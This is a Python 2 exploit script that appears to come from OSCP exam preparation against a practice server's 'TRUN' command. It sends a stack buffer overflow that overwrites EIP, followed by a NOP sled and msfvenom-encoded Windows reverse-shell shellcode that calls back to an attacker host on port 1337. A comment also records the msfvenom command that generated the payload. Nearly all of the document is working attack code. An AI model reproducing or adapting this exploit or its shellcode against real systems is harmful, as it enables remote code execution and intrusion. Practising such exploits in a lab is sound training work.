#!/usr/bin/python2
import time, struct, sys
import socket as so


# Configuration
server = '172.16.52.131'
port = 5555

prefix = 'TRUN .'
a_len = 2100

pattern_len = 400
eip_at = 306
eip_diff = pattern_len - eip_at

eip = b'\xBB\x11\x50\x62'
nops = '\x90' * 16

# root@kali:~/oscp/prep# msfvenom -p windows/shell_reverse_tcp LHOST=172.16.52.132 LPORT=1337 -f py -e x86/shikata_ga_nai -b "\x00"
# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# [-] No arch selected, selecting arch: x86 from the payload
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 351 (iteration=0)
# x86/shikata_ga_nai chosen with final size 351
# Payload size: 351 bytes
# Final size of py file: 1684 bytes
buf =  ""
buf += "\xdb\xd2\xd9\x74\x24\xf4\x58\xbe\x61\x6b\xac\xca\x31"
buf += "\xc9\xb1\x52\x83\xe8\xfc\x31\x70\x13\x03\x11\x78\x4e"
buf += "\x3f\x2d\x96\x0c\xc0\xcd\x67\x71\x48\x28\x56\xb1\x2e"
buf += "\x39\xc9\x01\x24\x6f\xe6\xea\x68\x9b\x7d\x9e\xa4\xac"
buf += "\x36\x15\x93\x83\xc7\x06\xe7\x82\x4b\x55\x34\x64\x75"
buf += "\x96\x49\x65\xb2\xcb\xa0\x37\x6b\x87\x17\xa7\x18\xdd"
buf += "\xab\x4c\x52\xf3\xab\xb1\x23\xf2\x9a\x64\x3f\xad\x3c"
buf += "\x87\xec\xc5\x74\x9f\xf1\xe0\xcf\x14\xc1\x9f\xd1\xfc"
buf += "\x1b\x5f\x7d\xc1\x93\x92\x7f\x06\x13\x4d\x0a\x7e\x67"
buf += "\xf0\x0d\x45\x15\x2e\x9b\x5d\xbd\xa5\x3b\xb9\x3f\x69"
buf += "\xdd\x4a\x33\xc6\xa9\x14\x50\xd9\x7e\x2f\x6c\x52\x81"
buf += "\xff\xe4\x20\xa6\xdb\xad\xf3\xc7\x7a\x08\x55\xf7\x9c"
buf += "\xf3\x0a\x5d\xd7\x1e\x5e\xec\xba\x76\x93\xdd\x44\x87"
buf += "\xbb\x56\x37\xb5\x64\xcd\xdf\xf5\xed\xcb\x18\xf9\xc7"
buf += "\xac\xb6\x04\xe8\xcc\x9f\xc2\xbc\x9c\xb7\xe3\xbc\x76"
buf += "\x47\x0b\x69\xd8\x17\xa3\xc2\x99\xc7\x03\xb3\x71\x0d"
buf += "\x8c\xec\x62\x2e\x46\x85\x09\xd5\x01\x06\xdd\xe1\x55"
buf += "\x3e\xdc\x09\x53\x86\x69\xef\x31\xe8\x3f\xb8\xad\x91"
buf += "\x65\x32\x4f\x5d\xb0\x3f\x4f\xd5\x37\xc0\x1e\x1e\x3d"
buf += "\xd2\xf7\xee\x08\x88\x5e\xf0\xa6\xa4\x3d\x63\x2d\x34"
buf += "\x4b\x98\xfa\x63\x1c\x6e\xf3\xe1\xb0\xc9\xad\x17\x49"
buf += "\x8f\x96\x93\x96\x6c\x18\x1a\x5a\xc8\x3e\x0c\xa2\xd1"
buf += "\x7a\x78\x7a\x84\xd4\xd6\x3c\x7e\x97\x80\x96\x2d\x71"
buf += "\x44\x6e\x1e\x42\x12\x6f\x4b\x34\xfa\xde\x22\x01\x05"
buf += "\xee\xa2\x85\x7e\x12\x53\x69\x55\x96\x63\x20\xf7\xbf"
buf += "\xeb\xed\x62\x82\x71\x0e\x59\xc1\x8f\x8d\x6b\xba\x6b"
buf += "\x8d\x1e\xbf\x30\x09\xf3\xcd\x29\xfc\xf3\x62\x49\xd5"

# Exploit
payload = nops + buf
the_req = prefix + b'A' * (a_len - eip_diff) + eip + payload

# Pwn
s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect((server, port))
print repr(s.recv(1024))
s.send(the_req)
print repr(s.recv(1024))

s.close()

